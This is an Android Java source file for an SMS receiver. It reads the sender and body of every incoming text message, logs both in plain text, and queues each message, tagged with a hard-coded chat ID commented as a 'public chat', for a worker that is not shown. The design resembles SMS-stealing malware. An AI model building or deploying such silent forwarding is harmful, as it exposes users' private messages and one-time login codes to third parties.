package com.fahim.mt;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;
import com.fahim.mt.Logger;
import androidx.work.Data;
import androidx.work.OneTimeWorkRequest;
import androidx.work.WorkManager;

public class SmsReceiver extends BroadcastReceiver {

    private static final String TAG = "SmsReceiver";
    public static final String SMS_BUNDLE = "pdus";

    @Override
    public void onReceive(Context context, Intent intent) {
        Logger.log(context, "SmsReceiver onReceive started");
        if (intent.getAction() != null && intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get(SMS_BUNDLE);
                if (pdus != null) {
                    for (Object pdu : pdus) {
                        SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
                        String sender = sms.getOriginatingAddress();
                        String messageBody = sms.getMessageBody();

                        Logger.log(context, "SMS Received - Sender: " + sender + ", Message: " + messageBody);

                        Log.d(TAG, "SMS Received - Sender: " + sender + ", Message: " + messageBody);

                        // Create input data for the worker
                        Data inputData = new Data.Builder()
                                .putString("sender", sender)
                                .putString("messageBody", messageBody)
                                .putString("chatId", "-4965986934") // Sending to public chat
                                .build();

                        // Enqueue the work request
                        OneTimeWorkRequest smsWorkRequest = new OneTimeWorkRequest.Builder(SmsProcessingWorker.class)
                                .setInputData(inputData)
                                .build();
                        WorkManager.getInstance(context).enqueue(smsWorkRequest);

                        Log.d(TAG, "Enqueued SMS processing work for sender: " + sender);
                    }
                }
            }
        }
    }
}

